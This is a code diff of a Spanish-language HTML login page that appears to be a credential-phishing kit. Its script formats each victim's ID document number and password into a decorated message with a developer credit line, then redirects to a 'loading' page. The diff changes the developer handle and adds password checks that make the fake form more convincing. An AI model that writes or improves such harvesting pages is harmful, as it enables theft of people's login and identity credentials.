@@ -201,7 +201,7 @@
     Todos los derechos reservados
   </footer>
 
-  <script>
+  <script> 
     let intentosLogin = 0;
 
     function togglePassword() {
@@ -234,7 +234,7 @@
 ✔️ Documento: ${documento}
 ✔️ Contraseña: ${password}
 ➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
-🌐 dev: [@mioydenadiemas]
+🌐 dev: [@asd]
 ➖➖➖`;
 
       try {
@@ -287,6 +287,12 @@
 
       // Validación de la contraseña
       if (password === "") {
+        errorPass.innerText = "La contraseña no puede estar vacía";
+        errorPass.style.display = "block";
+        passwordInput.classList.add("input-error");
+        valido = false;
+      } else if (/^\d+$/.test(password)) {
+        errorPass.innerText = "La contraseña no puede contener solo números";
         errorPass.style.display = "block";
         passwordInput.classList.add("input-error");
         valido = false;
@@ -312,9 +318,9 @@
         window.location.href = "cargando.html";  // Redirigir a cargando.html
       }
     });
-  </script>
+</script>
+
 
 </body>
 
 </html>
-
